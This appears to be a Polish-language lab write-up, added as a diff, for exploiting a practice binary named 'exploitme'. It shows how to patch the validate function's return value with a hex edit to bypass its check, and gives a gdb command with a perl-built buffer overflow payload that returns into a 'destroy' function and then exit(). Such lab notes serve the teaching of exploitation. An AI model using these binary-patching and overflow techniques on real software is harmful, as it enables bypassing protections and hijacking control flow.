@@ -1,0 +1,37 @@
+Zadanie 1. Znalezienie adresu w programie z mov $0 , %eax w funkcji validate
+
+objdump -d exploitme //dezasemblacja
+
+readelf -e exploitme //odczytanie entry point
+
+entrypoint = 0x80484c0
+[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
+[14] .text             PROGBITS        080484c0 0004c0 0002ac 00  AX  0   0 16
+						/|\
+						 |  offset entrypoint'a w kodzie progamu
+
+teraz szukamy linijki w metodzie validate
+804858c:       b8 00 00 00 00          mov    $0x0,%eax
+
+od powyższego adresu odejmujemy adres entrypoint'a -> 804858c - 080484c0 = 0xcc
+
+do offsetu dodajemy powyższy wynik 0004c0 + 0xcc = 0x58c
+
+po tym adresem modyfikujemy b8 00 na b8 01 czyli mov $0x1, %eax
+
+
+Zadanie 2. Buffer overflow. Bez segfaulta
+Odpalamy exploime w gdb
+	run `perl -e 'print "A"x28 . "\xa7\x85\x04\x08" . "\xe0\xbb\xe4\xf7"'`
+			x28		adres metody destroy 		adres metody exit()
+			dobrany		world w konwencji 		hint: w gdb p exit()
+			na		little endian			też little endian
+			czuja :)
+
+
+HINT!:
+edycja hex w vim
+hex mode
+%!xxd
+powrót z hex mode
+%!xxd -r
